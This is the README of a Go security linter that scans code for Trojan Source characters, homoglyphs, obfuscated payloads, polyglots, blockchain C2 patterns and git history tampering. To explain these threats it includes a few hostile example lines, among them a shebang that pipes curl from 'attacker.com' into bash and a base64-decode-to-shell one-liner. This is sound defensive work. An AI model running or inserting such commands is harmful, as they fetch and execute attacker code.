# go-sec-lint

Static analysis for the stuff your linter doesn't look at: invisible Unicode, obfuscated payloads, polyglot files, blockchain C2 channels, and tampered git history.

Zero dependencies. Single binary. Exits non-zero on findings, so you can drop it into CI.

## Install

```sh
go install github.com/lkendrickd/go-sec-lint@latest
```

Or build from source:

```sh
git clone https://github.com/lkendrickd/go-sec-lint.git
cd go-sec-lint
make build
```

## Usage

```sh
# Scan current directory (all checks on by default)
go-sec-lint .

# Scan specific paths
go-sec-lint src/ lib/utils.js

# Cherry-pick specific scanners
go-sec-lint --unicode --obfuscation src/

# Run everything except specific scanners
go-sec-lint --skip blockchain-c2,steganography .

# Combine: cherry-pick some, skip others
go-sec-lint --unicode --obfuscation --shebang --skip shebang .

# Add custom file extensions
go-sec-lint --ext .vue,.svelte .

# Quiet mode (findings only, no summary)
go-sec-lint -q .

# Disable color (or pipe to a file)
go-sec-lint --no-color . > report.txt
```

Scanner selection works in two modes:

- **Default**: all scanners run. Use `--skip` to exclude specific ones.
- **Cherry-pick**: pass individual scanner flags to run only those. `--skip` can further narrow the selection.

## Scanners

All scanners run by default. Pass individual flags to run a subset.

| Flag | Category | What it detects |
|------|----------|-----------------|
| `--unicode` | `bidi`, `invisible`, `homoglyph`, `tag` | Bidirectional text overrides ([Trojan Source](https://trojansource.codes/) / CVE-2021-42574), zero-width characters that hide payloads, Cyrillic/Greek letters that spoof ASCII identifiers, Unicode tag characters |
| `--null-byte` | `null-byte` | Null bytes in text files used for string terminator injection |
| `--shebang` | `shebang` | Shebangs that pipe from curl/wget, or use non-standard interpreter paths |
| `--obfuscation` | `obfuscation` | Base64 decoded and piped to shell, eval with encoded payloads, long hex/octal escape sequences, large base64 blobs, eval with string concatenation |
| `--polyglot` | `polyglot` | Files whose magic bytes (ZIP/JAR, PDF, ELF, PE) don't match their extension |
| `--extension` | `extension` | Double extensions hiding executables (e.g., `readme.txt.exe`), RTL override in filenames, non-printable characters in filenames |
| `--steganography` | `steganography` | Hex, binary, or base64 data hidden inside source code comments |
| `--blockchain-c2` | `blockchain-c2` | Solana/Ethereum RPC calls, SDK imports, memo field parsing, and transaction polling patterns indicative of [blockchain-based C2 dead-drops](https://dev.to/ohmygod/glassworms-solana-c2-how-a-supply-chain-monster-turned-the-blockchain-into-a-dead-drop-56dd) |
| `--git-anomaly` | `git-anomaly` | Author-vs-committer date skew >7 days in recent commits, indicating force-pushed or rebased malicious history |

## What these threats actually are

Not everyone has seen these attacks before. Here's what each one does in plain terms.

### Trojan Source (bidirectional text)

Unicode has invisible control characters that flip the direction text renders: left-to-right vs right-to-left. Stick one of these in source code and the editor shows one thing while the compiler runs something else. A line that reads `if (isAdmin)` on screen could execute as `if (isUser)` because hidden characters rearranged the visible text. CVE-2021-42574. Works in every language.

### Homoglyphs

Cyrillic "a" (U+0430) and Latin "a" (U+0061) look the same on screen. They are not the same character. Name a function with Cyrillic look-alikes and it compiles as a separate symbol, but nobody reading the code can tell. The variable `password` and `pаssword` (with a Cyrillic "a" in position 2) are two different identifiers.

### Zero-width and invisible characters

A zero-width space (U+200B) is in the file but takes up no space on screen. Put one inside `require('./utils')` and it resolves to a different path than `require('./utils')`. Same idea works in variable names and import statements. Two identifiers that look identical in every editor can point to completely different things.

### Polyglot files

A polyglot is valid as more than one file format at the same time. A `.js` file can also have a ZIP header at the top. Open it as JavaScript, it runs code. Open it as a ZIP, it extracts files. This gets past anything that checks file extensions but doesn't inspect the actual bytes.

### Steganography in code

Hiding data inside something that looks normal. In practice: someone buries a long hex string or base64 blob in a code comment. The compiler ignores comments, but other code in the file reads the comment at runtime, decodes it, and executes whatever was hidden there.

### Code obfuscation

Making code hard to read on purpose. The classic: `echo payload | base64 -d | bash`. Also: building strings one character at a time to dodge grep (`eval(chr(72) + chr(101))`), or dropping a massive base64 blob into a variable that gets decoded and run later.

### Blockchain C2

Normal malware calls a server for instructions. Take the server down, the malware goes dark. Blockchain C2 writes instructions into on-chain transaction memo fields instead. The infected code polls the blockchain, reads the latest memo, and follows whatever URL is in it. The attacker posts a new transaction to rotate URLs. No server to seize, no domain to kill. The GlassWorm campaign in 2026 did this with Solana across hundreds of compromised npm packages and VSCode extensions.

### Shebang attacks

The shebang (`#!`) on line 1 of a script tells the OS which interpreter to run. `#!/usr/bin/env curl attacker.com | bash` downloads and runs arbitrary code. `#!/tmp/.hidden/python` points to whatever the attacker put there. Legitimate shebangs use `/usr/bin/`, `/bin/`, `/usr/local/bin/`, or `/usr/bin/env`.

### Double extension spoofing

`invoice.pdf.exe` looks like a PDF if your file browser hides known extensions. It's an executable. Same trick works with scripts: `data.csv.sh` looks like a spreadsheet, runs as a shell script.

### Null byte injection

C and most system APIs treat `0x00` as the end of a string. Put a null byte in a text file and different tools see different content. A security scanner might stop reading at the null while the interpreter processes the whole file. Whatever comes after the null byte runs undetected.

### Git history tampering

Every git commit has two dates: the author date (when the code was written) and the committer date (when it was applied to the branch). Normally these are seconds apart. When someone force-pushes malicious commits into a repo, the committer date is recent but the author date is old (or forged to look old). A gap of more than 7 days between these two dates is a strong tell. Supply-chain attackers use this to make injected code look like it's been in the repo for months.

## Example output

```
src/utils.js
  line 14, col 8: [invisible] U+200B ZERO WIDTH SPACE
  line 31, col 1: [obfuscation] base64-decoded data piped to shell/eval

lib/config.py
  line 1, col 1: [shebang] suspicious shebang: #!/usr/bin/env curl | bash
  line 42, col 5: [homoglyph] U+0430 CYRILLIC SMALL A (looks like 'a')

[git history]
  [git-anomaly] commit a1b2c3d4e5f6: author date 2025-01-01 vs committer date 2025-03-15 (73 day skew) - suspicious commit

Found 4 threat(s) in 2 file(s) (128 files scanned)
  Breakdown: 1 invisible, 1 homoglyph, 1 shebang, 1 obfuscation, 1 git-anomaly
```

## CI integration

`go-sec-lint` exits with code 1 when it finds something. Drop it into CI:

GitHub Actions (runs on PRs and merges to main):

```yaml
# .github/workflows/security-lint.yml
name: Security Lint

on:
  pull_request:
  push:
    branches: [main]

jobs:
  go-sec-lint:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 100 # needed for git-anomaly scanner

      - uses: actions/setup-go@v5
        with:
          go-version: stable

      - name: Install go-sec-lint
        run: go install github.com/lkendrickd/go-sec-lint@latest

      - name: Run security lint
        run: go-sec-lint .
```

Pre-commit hook:

```sh
#!/bin/sh
go-sec-lint --unicode --obfuscation .
```

Makefile target:

```makefile
sec-lint:
	go-sec-lint .
```

## Supported file types

Scans `.py`, `.js`, `.ts`, `.go`, `.rs`, `.java`, `.c`, `.cpp`, `.rb`, `.php`, `.sh`, `.html`, `.css`, `.json`, `.yaml`, `.toml`, `.xml`, `.sql`, `.tf`, and others by default. `Makefile` and `Dockerfile` are always included.

Skips `.git`, `node_modules`, `__pycache__`, `.venv`, `vendor`, `target`, `dist`, `build`, `.idea`, `.vscode`.

Use `--ext` to add more.

## Project layout

```
go-sec-lint/
├── main.go                          CLI entry point
├── Makefile                         Build, lint, test targets
├── go.mod
├── internal/
│   ├── output/
│   │   └── printer.go               Terminal output formatting
│   └── scan/
│       ├── finding.go               Finding, Results types, threat categories
│       ├── scanner.go               File walking and scan orchestration
│       ├── unicode.go               Bidi, invisible chars, homoglyphs, filenames
│       ├── content.go               Obfuscation, shebangs, steganography, polyglots
│       ├── blockchain.go            Blockchain C2 pattern detection
│       └── git.go                   Git commit history anomalies
```

## Development

```sh
make           # lint + build
make lint      # run golangci-lint (auto-installs if missing)
make test      # run tests with race detector
make vet       # go vet
make clean     # remove binary
```

## License

MIT
